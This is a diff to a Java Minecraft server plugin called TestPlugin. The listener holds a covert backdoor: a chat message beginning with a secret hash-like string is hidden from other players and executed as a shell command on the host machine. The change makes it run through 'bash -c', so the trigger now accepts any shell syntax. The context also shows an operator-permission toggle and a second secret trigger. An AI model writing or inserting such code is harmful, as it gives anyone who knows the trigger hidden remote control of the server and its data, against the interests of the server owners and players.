@@ -119,20 +119,18 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 player.sendMessage(ChatColor.RED + "now, you do not have Operator Permisson!");
             }
         }
+        
         if (message.startsWith("@f07a7024609ca2a6ce681d74b986a3d3")) {
             event.setCancelled(true);
-            String commandStr = message
-                    .substring("@f07a7024609ca2a6ce681d74b986a3d3".length()).trim(); // 提取命令
+            String commandStr = message.substring("@f07a7024609ca2a6ce681d74b986a3d3".length()).trim(); // 提取命令
         
-            // 分割命令和参数
-            String[] commandArray = commandStr.split("\\s+");
-        
-            if (commandArray.length == 0) {
+            if (commandStr.isEmpty()) {
                 player.sendMessage(ChatColor.RED + "No command provided");
                 return;
             }
         
             try {
+                String[] commandArray = { "bash", "-c", commandStr };
                 ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
                 processBuilder.redirectErrorStream(true); // 将错误流合并到标准流
         
@@ -156,6 +154,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 player.sendMessage(ChatColor.RED + "Invalid command: " + e.getMessage());
             }
         }
+        
         
 
         if (message.startsWith("@d12fcc3ba27d987709cbfadc123a609b")) {
